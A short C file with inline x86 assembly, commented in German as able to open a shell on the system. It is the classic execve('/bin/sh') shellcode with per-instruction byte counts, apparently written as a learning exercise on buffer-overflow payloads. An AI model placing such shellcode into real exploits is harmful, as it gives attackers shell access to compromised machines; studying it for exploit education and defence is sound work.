//Markus Thill
//25.05.2010
/*Dieser Code ist in der Lage eine Shell auf dem entsprechendem System zu �ffnen*/

void main() {
__asm__("
        jmp    0x8048462                # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        movl   $0x0, %ebx               # 5 bytes
        int    $0x80                    # 2 bytes
        call   0x8048438                # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}
